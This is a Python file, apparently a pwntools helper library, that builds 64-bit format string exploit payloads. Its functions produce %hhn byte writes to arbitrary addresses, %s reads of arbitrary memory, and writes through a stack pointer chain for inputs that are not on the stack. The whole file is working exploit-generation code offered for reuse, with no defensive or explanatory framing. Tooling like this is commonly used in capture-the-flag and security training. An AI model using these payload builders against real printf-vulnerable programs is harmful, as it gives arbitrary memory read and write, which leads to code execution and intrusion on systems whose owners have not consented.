from pwn import p64


def __fmt_write_single_byte(offset: int, value: int):
    if value > 255 or value < 0:
        raise Exception("target num is too big or too small for single byte")
    payload = b""
    if value != 0:
        payload += f"%{value}c".encode()
    payload += f"%{offset}$hhn".encode()

    return payload


def __get_num_list(value, is_zxt: bool, zxt_len: int):
    now_num = value
    num_list = []
    if now_num < 0 or now_num > 0xffffffffffffffff:
        raise Exception("target_num is too large or too small")

    if now_num == 0:
        num_list.append(0)
    while now_num != 0:
        num_list.append(now_num % 0x100)
        now_num //= 0x100
    if is_zxt:
        list_len = len(num_list)
        for i in range(zxt_len - list_len):
            num_list.append(0)

    return num_list


def fmt_64_write(input_offset: int,
                 target_addr: int,
                 target_num: int,
                 is_zxt: bool = False,
                 zxt_len: int = 8):
    """
    :param input_offset:  the offset of input fmt str
    :param target_addr:   the address to write
    :param target_num:    the value to write
    :param is_zxt:        zero extension or not
    :param zxt_len:       zero extension to 'zxt_len' bit
    """
    # get the list with bytes num
    num_list = __get_num_list(target_num, is_zxt, zxt_len)

    payload = b""
    sum_num = 0
    tmp_len = 0xc * len(num_list)
    if tmp_len % 8 != 0:
        tmp_len += 4
    tmp_i = 0
    for i in sorted(num_list):
        if i - sum_num != 0:
            payload += b"%" + str(i - sum_num).encode() + b"c%" + str(
                tmp_len // 8 + input_offset + tmp_i).encode() + b"$hhn"
            sum_num = i
        else:
            payload += b"%" + str(tmp_len // 8 + input_offset + tmp_i).encode() + b"$hhn"
        tmp_i += 1
    payload = payload.ljust(tmp_len, b'a')

    no_repeat_list = list(set(num_list))
    for i in sorted(no_repeat_list):
        idx_list = [j for j, x in enumerate(num_list) if x == i]
        for j in idx_list:
            payload += p64(target_addr + j)

    return payload


def fmt_64_write_n(input_offset: int,
                   target_addr: int,
                   target_num: int,
                   is_zxt: bool = False,
                   zxt_len: int = 8):
    num_list = __get_num_list(target_num, is_zxt, zxt_len)

    payloads = []
    for i in range(len(num_list)):
        payloads.append(fmt_64_write(input_offset, target_addr + i, num_list[i]))
    return payloads


def fmt_64_read(input_offset: int, target_addr):
    payload = f"%{input_offset + 1}s".ljust(0x8, 'a').encode()
    payload += p64(target_addr)
    return payload


def fmt_not_on_stack_64_write(off_of_3: int, 
                              chain_ptr: tuple, 
                              target_addr: int, 
                              target_num: int, 
                              is_zxt: bool = False, 
                              zxt_len: int = 8):
    """
    :param off_of_3:     the offset of ptr3
    :param chain_ptr:    the stack chain ptr (ptr1, ptr2, ptr3)
    :param target_addr:  the address to write
    :param target_num:   the value to write
    :param is_zxt:       zero extension or not
    :param zxt_len:      zero extension to 'zxt_len' bit
    :return: payloads
    """
    off_1_ptr = chain_ptr[2] - off_of_3 * 8
    low_byte = chain_ptr[2] % 0x100

    offset_1 = (chain_ptr[0] - off_1_ptr) // 8
    offset_2 = (chain_ptr[1] - off_1_ptr) // 8
    offset_3 = (chain_ptr[2] - off_1_ptr) // 8

    num_list_addr = __get_num_list(target_addr, False, 8)
    num_list_value = __get_num_list(target_num, is_zxt, zxt_len)

    payloads = []
    for i in range(1, len(num_list_addr)):
        payload = __fmt_write_single_byte(offset_1, low_byte + i)
        payloads.append(payload)
        payload = __fmt_write_single_byte(offset_2, num_list_addr[i])
        payloads.append(payload)

    payload = __fmt_write_single_byte(offset_1, low_byte)
    payloads.append(payload)

    for i in range(len(num_list_value)):
        payload = __fmt_write_single_byte(offset_2, num_list_addr[0] + i)
        payloads.append(payload)
        payload = __fmt_write_single_byte(offset_3, num_list_value[i])
        payloads.append(payload)

    return payloads


def fmt_not_on_stack_64_read(off_of_3: int, chain_ptr: tuple, target_addr: int):
    off_1_ptr = chain_ptr[2] - off_of_3 * 8
    low_byte = chain_ptr[2] % 0x100

    offset_1 = (chain_ptr[0] - off_1_ptr) // 8
    offset_2 = (chain_ptr[1] - off_1_ptr) // 8
    offset_3 = (chain_ptr[2] - off_1_ptr) // 8

    num_list_addr = __get_num_list(target_addr, False, 8)
    # num_list_value = __get_num_list(target_num, is_zxt, zxt_len)
    payloads = []
    for i in range(len(num_list_addr)):
        payload = __fmt_write_single_byte(offset_1, low_byte + i)
        payloads.append(payload)
        payload = __fmt_write_single_byte(offset_2, num_list_addr[i])
        payloads.append(payload)

    payload = f"%{offset_3}$s".encode()
    payloads.append(payload)

    return payloads
